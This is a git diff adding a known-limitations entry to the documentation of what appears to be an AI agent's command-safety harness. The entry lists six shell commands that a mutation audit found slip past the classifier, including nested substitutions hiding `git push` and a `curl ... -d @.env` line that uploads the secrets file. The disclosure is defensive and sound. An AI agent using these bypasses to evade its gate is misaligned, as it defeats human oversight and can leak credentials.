@@ -495,6 +495,17 @@ refuses a repository owned by another user.
   fsmonitor and drivers, but other repository settings the agent could write there (for example
   `core.worktree`) are only as safe as the host.
 - Redaction is pattern-based. Secrets in unrecognized formats pass through.
+- The mutation audit found six commands the classifier lets through without a gate. Each is a
+  strict `xfail` test (`KNOWN_GAPS` in
+  [`test_safety_bypasses.py`](../python/tests/unit/test_safety_bypasses.py)), so fixing one
+  fails the suite until its test is updated:
+  - a command substitution inside arithmetic, `sh -c 'echo $(( $(git push) ))'`;
+  - an httpie data item whose value is a URL, `http example.com next=https://evil.test`, which
+    still sends a body;
+  - `env -- FOO=1 git push` (env still reads `NAME=value` after `--`);
+  - a `#` inside a word in `sh -c`, which ends the parse early (`echo a#b; git push`, and
+    `curl https://example.com/#a -d @.env`);
+  - a substitution nested in escaped backticks, ``` sh -c 'echo `echo \`git push\``' ```.
 - The E2B adapter's workspace sync is tested against a fake SDK, not the E2B service. Files a
   background process writes in the VM after a command returns reach the host only with the next
   command's sync (see section 1).
